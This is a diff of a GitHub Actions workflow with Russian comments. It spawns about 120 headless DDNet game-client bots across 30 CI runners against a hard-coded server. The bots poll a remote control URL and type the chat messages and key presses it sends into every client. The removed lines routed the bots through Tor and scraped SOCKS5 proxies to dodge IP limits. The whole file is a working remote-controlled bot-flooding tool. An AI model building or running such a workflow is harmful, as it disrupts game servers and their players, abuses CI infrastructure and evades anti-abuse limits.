@@ -1,108 +1,91 @@
-name: DDNet TOR-SOCKS UDP Army FIXED
+name: DDNet Bot Army Official Control
 
 on: 
   workflow_dispatch:
-    inputs:
-      server_ip:
-        description: 'IP:PORT сервера DDNet'
-        required: true
-        default: '46.174.48.103:51011'
 
 jobs:
   spawn-bots:
     strategy:
       fail-fast: false
       matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        # 30 машин по 4 бота = 120 ботов
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]
     
     runs-on: ubuntu-latest
     
     steps:
-      - name: Install All Dependencies
+      - name: Install Dependencies
         run: |
-          sudo apt-get update -y
-          sudo apt-get install -y xvfb xdotool jq libsdl2-2.0-0 libcurl4 libfreetype6 libgl1-mesa-dri proxychains4 tor netcat-openbsd libnotify4 libxss1 libvulkan1
-
-      - name: Setup TOR & Proxychains
+          sudo apt-get update
+          sudo apt-get install -y xvfb xdotool jq libsdl2-2.0-0 libcurl4 libfreetype6 libgl1 libglx-mesa0 libglu1-mesa libnotify4 libpng16-16 libvorbisfile3
+      
+      - name: Download DDNet Client
         run: |
-          sudo systemctl start tor
-          echo "strict_chain" > proxychains.conf
-          echo "proxy_dns" >> proxychains.conf
-          echo "remote_dns_res" >> proxychains.conf
-          echo "[ProxyList]" >> proxychains.conf
+          LINK=$(curl -s https://ddnet.org/downloads/ | grep -o 'href="[^"]*linux_x86_64\.tar\.xz"' | head -n 1 | cut -d'"' -f2)
+          curl -L -o ddnet.tar.xz "https://ddnet.org/downloads/$LINK"
+          tar -xf ddnet.tar.xz
+          mv DDNet-* ddnet_folder
 
-      - name: Find Proxy Fast
-        run: |
-          # Скрапим прокси через ТОР
-          curl --socks5-hostname 127.0.0.1:9050 -sL "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=5000&country=all&simplified=true" | tr -d '\r' > socks5_list.txt
-          
-          FOUND=false
-          for i in {1..20}; do
-            PROXY=$(shuf -n 1 socks5_list.txt)
-            [ -z "$PROXY" ] && continue
-            IP=$(echo $PROXY | cut -d':' -f1)
-            PORT=$(echo $PROXY | cut -d':' -f2)
-            if timeout 2s nc -z $IP $PORT; then
-              echo "socks5 $IP $PORT" >> proxychains.conf
-              echo "✅ Нашел прокси: $IP:$PORT"
-              FOUND=true && break
-            fi
-          done
-          if [ "$FOUND" = "false" ]; then
-            echo "socks5 127.0.0.1 9050" >> proxychains.conf
-          fi
-          true # Чтобы шаг всегда завершался успешно
-
-      - name: Download & Run Fast
+      - name: Spawn & Control Army
         env:
-          CONTROL_URL: "https://lively-king-450c.5yearsme5.workers.dev/"
-          SERVER_ADDR: "${{ github.event.inputs.server_ip }}"
+          CONTROL_URL: "https://me5years.alwaysdata.net/index.php?action=get"
+          SERVER_ADDR: "5.189.17.23:2126"
         run: |
-          set +e
-          mkdir -p ddnet_folder
-          # Качаем напрямую в tar для скорости
-          wget -qO- https://ddnet.org/downloads/DDNet-18.1-linux_x86_64.tar.xz | tar -xJ --strip-components=1 -C ddnet_folder
-          chmod +x ddnet_folder/DDNet
-          
           cd ddnet_folder
-          # Виртуальный экран
-          Xvfb :99 -screen 0 640x480x24 +extension GLX -noreset &
+          
+          # Запуск виртуального экрана
           export DISPLAY=:99
-          
-          # Конфиг
-          NAME="Bot_${{ matrix.instance }}_$((RANDOM % 999))"
-          echo "player_name \"$NAME\"" > bot.cfg
-          echo "snd_enable 0" >> bot.cfg
-          echo "gfx_screen_width 640" >> bot.cfg
-          echo "gfx_screen_height 480" >> bot.cfg
+          Xvfb :99 -screen 0 1024x768x24 &
+          sleep 3
 
-          # Запуск (Основа + 2 дамми)
-          proxychains4 -f ../proxychains.conf ./DDNet -f bot.cfg "connect $SERVER_ADDR; cl_dummy_name ${NAME}_d1; +dummy_connect; cl_dummy_name ${NAME}_d2; +dummy_connect" > ../ddnet.log 2>&1 &
-          
-          echo "Армия запущена. Контроль через Worker..."
+          # Запуск 4 ботов (лимит IP на многих серверах)
+          SKINS=("default" "bluekitty" "cammostripes" "redbopp" "bluestripe")
+          for i in {1..4}; do
+            RAND_SKIN=${SKINS[$RANDOM % ${#SKINS[@]}]}
+            cat << EOF > "bot$i.cfg"
+          cl_show_welcome 0
+          cl_motd_time 0
+          cl_auto_join_team 1
+          player_name "Bot_${{ matrix.instance }}_$i"
+          player_skin "$RAND_SKIN"
+          EOF
+            # Запуск официального клиента в фоне
+            ./DDNet -f "bot$i.cfg" "connect $SERVER_ADDR" > /dev/null 2>&1 &
+            sleep 2
+          done
+
+          echo "Армия заспавнена. Слушаю команды..."
           
           LAST_ID="0"
           while true; do
-            # Опрос воркера
-            CMD_JSON=$(curl -s --max-time 2 "$CONTROL_URL" || echo '{"id":"0"}')
-            ID=$(echo "$CMD_JSON" | jq -r '.id // 0' 2>/dev/null)
+            # Получаем команду из Alwaysdata
+            CMD_JSON=$(curl -s "$CONTROL_URL" || echo '{"id":"0"}')
+            ID=$(echo "$CMD_JSON" | jq -r '.id // 0')
             
+            # Если ID команды изменился - выполняем
             if [ "$ID" != "$LAST_ID" ] && [ "$ID" != "0" ]; then
               LAST_ID=$ID
-              VAL=$(echo "$CMD_JSON" | jq -r '.value // ""' 2>/dev/null)
-              TYPE=$(echo "$CMD_JSON" | jq -r '.type // ""' 2>/dev/null)
+              TYPE=$(echo "$CMD_JSON" | jq -r '.type')
+              VAL=$(echo "$CMD_JSON" | jq -r '.value')
               
-              WIDS=$(xdotool search --class "DDNet" 2>/dev/null)
+              echo "Команда принята: $TYPE -> $VAL"
+              
+              # Ищем все окна DDNet
+              WIDS=$(xdotool search --class "DDNet")
+              
               for WID in $WIDS; do
                 if [ "$TYPE" == "chat" ]; then
-                  xdotool key --window $WID t sleep 0.1 type --window $WID "$VAL" sleep 0.1 key --window $WID Return
-                else
+                  # Чат через эмуляцию клавиш
+                  xdotool key --window $WID t
+                  sleep 0.1
+                  xdotool type --window $WID "$VAL"
+                  sleep 0.1
+                  xdotool key --window $WID Return
+                elif [ "$TYPE" == "key" ]; then
+                  # Любая клавиша (space, a, d, s)
                   xdotool key --window $WID "$VAL"
                 fi
               done
             fi
-            
-            # Если процесс упал - респ
-            pgrep -x "DDNet" > /dev/null || proxychains4 -f ../proxychains.conf ./DDNet -f bot.cfg "connect $SERVER_ADDR; +dummy_connect" > /dev/null 2>&1 &
             sleep 2
           done
